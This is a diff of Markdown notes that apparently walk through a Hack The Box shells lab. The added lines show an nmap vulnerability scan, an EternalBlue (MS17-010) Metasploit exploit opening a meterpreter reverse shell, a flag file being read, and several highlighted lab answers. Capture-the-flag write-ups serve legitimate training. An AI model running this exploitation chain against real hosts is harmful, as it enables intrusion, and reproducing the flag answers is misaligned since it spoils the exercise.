@@ -238,7 +238,7 @@ Nmap done: 1 IP address (1 host up) scanned in 531.19 seconds
 if you access the first service through a browser,  don't forget to enable the socks proxy manually in  the browser configuration, so you can gain advantage of pivoting.
 ![[Pasted image 20240428191919.png]]
 
-> The asnwer is : **shells-winsvr**
+> ==The asnwer is : **shells-winsvr**==
 
 ## 2 -  Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)
 
@@ -260,6 +260,7 @@ dir c:\shares\
 
 ![[Pasted image 20240504135829.png]]
 
+> ==The asnwer is : **dev-share**
 ---
 
 ## Host 2
@@ -493,7 +494,7 @@ B1nD_Shells_r_cool
 meterpreter > 
 ```
 
-> The asnwer is : **B1nD_Shells_r_cool**
+> ==The asnwer is : **B1nD_Shells_r_cool**==
 
 
 ---
@@ -552,6 +553,80 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds
 
 ```
+### Now let's check for vulnerabilities
+```
+┌─[✗]─[htb-student@skills-foothold]─[~]
+└──╼ $sudo nmap -sV --script vuln -O -Pn --disable-arp-ping -p 80,135,139,445 172.16.1.13
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-10 16:27 EDT
+Nmap scan report for 172.16.1.13
+Host is up (0.0017s latency).
+
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-enum: 
+|_  /uploads/: Potentially interesting folder
+| http-fileupload-exploiter: 
+|   
+|     Failed to upload and execute a payload.
+|   
+|     Failed to upload and execute a payload.
+|   
+|     Failed to upload and execute a payload.
+|   
+|     Failed to upload and execute a payload.
+|   
+|_    Failed to upload and execute a payload.
+| http-aspnet-debug: 
+|_  status: DEBUG is enabled
+|_http-server-header: Microsoft-IIS/10.0
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=172.16.1.13
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://172.16.1.13:80/upload.aspx
+|     Form id: form1
+|_    Form action: ./upload.aspx
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+MAC Address: 00:50:56:B9:05:57 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016 build 10586 - 14393
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 283.01 seconds
+```
+
+The target is vulnerable for Eternal Blue, to metasploit we go
+
+### Exploiting
+
 
 ```
 msf6 > search ms17-010
@@ -616,95 +691,8 @@ Exploit target:
 msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 172.16.1.13
 rhost => 172.16.1.13
 msf6 exploit(windows/smb/ms17_010_psexec) > setg lhost ens224
-lhost => ens224
-msf6 exploit(windows/smb/ms17_010_psexec) > 
-msf6 exploit(windows/smb/ms17_010_psexec) > options
-
-Module options (exploit/windows/smb/ms17_010_psexec):
-
-   Name                  Current Setting                      Required  Description
-   ----                  ---------------                      --------  -----------
-   DBGTRACE              false                                yes       Show extra debug trace info
-   LEAKATTEMPTS          99                                   yes       How many times to try to leak transaction
-   NAMEDPIPE                                                  no        A named pipe that can be connected to (leave blank for auto)
-   NAMED_PIPES           /usr/share/metasploit-framework/dat  yes       List of named pipes to check
-                         a/wordlists/named_pipes.txt
-   RHOSTS                                                     yes       The target host(s), range CIDR identifier, or hosts file with sy
-                                                                        ntax 'file:<path>'
-   RPORT                 445                                  yes       The Target port (TCP)
-   SERVICE_DESCRIPTION                                        no        Service description to to be used on target for pretty listing
-   SERVICE_DISPLAY_NAME                                       no        The service display name
-   SERVICE_NAME                                               no        The service name
-   SHARE                 ADMIN$                               yes       The share to connect to, can be an admin share (ADMIN$,C$,...) o
-                                                                        r a normal read/write folder share
-   SMBDomain             .                                    no        The Windows domain to use for authentication
-   SMBPass                                                    no        The password for the specified username
-   SMBUser                                                    no        The username to authenticate as
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.129.204.126   yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf6 exploit(windows/smb/ms17_010_psexec) > set lhost ens224
-lhost => ens224
-msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 172.16.1.13
-rhosts => 172.16.1.13
-msf6 exploit(windows/smb/ms17_010_psexec) > 
-msf6 exploit(windows/smb/ms17_010_psexec) > options
-
-Module options (exploit/windows/smb/ms17_010_psexec):
-
-   Name                  Current Setting                      Required  Description
-   ----                  ---------------                      --------  -----------
-   DBGTRACE              false                                yes       Show extra debug trace info
-   LEAKATTEMPTS          99                                   yes       How many times to try to leak transaction
-   NAMEDPIPE                                                  no        A named pipe that can be connected to (leave blank for auto)
-   NAMED_PIPES           /usr/share/metasploit-framework/dat  yes       List of named pipes to check
-                         a/wordlists/named_pipes.txt
-   RHOSTS                172.16.1.13                          yes       The target host(s), range CIDR identifier, or hosts file with sy
-                                                                        ntax 'file:<path>'
-   RPORT                 445                                  yes       The Target port (TCP)
-   SERVICE_DESCRIPTION                                        no        Service description to to be used on target for pretty listing
-   SERVICE_DISPLAY_NAME                                       no        The service display name
-   SERVICE_NAME                                               no        The service name
-   SHARE                 ADMIN$                               yes       The share to connect to, can be an admin share (ADMIN$,C$,...) o
-                                                                        r a normal read/write folder share
-   SMBDomain             .                                    no        The Windows domain to use for authentication
-   SMBPass                                                    no        The password for the specified username
-   SMBUser                                                    no        The username to authenticate as
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     ens224           yes       The listen address (an interface may be specified)
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf6 exploit(windows/smb/ms17_010_psexec) > 
-
+lhost => ens224 
+v
 msf6 exploit(windows/smb/ms17_010_psexec) > check
 
 [*] 172.16.1.13:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
@@ -723,5 +711,11 @@ msf6 exploit(windows/smb/ms17_010_psexec) > run
 [*] Sending stage (175174 bytes) to 172.16.1.13
 [*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2024-05-10 16:14:50 -0400
 
-
+meterpreter > cat C:\Users\Administrator\Desktop\Skills-flag.txt
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+meterpreter > 
+meterpreter > cat "C:\Users\Administrator\Desktop\Skills-flag.txt"
+One-H0st-Down!
 ```
+
+> *==The asnwer is : **One-H0st-Down!**==*
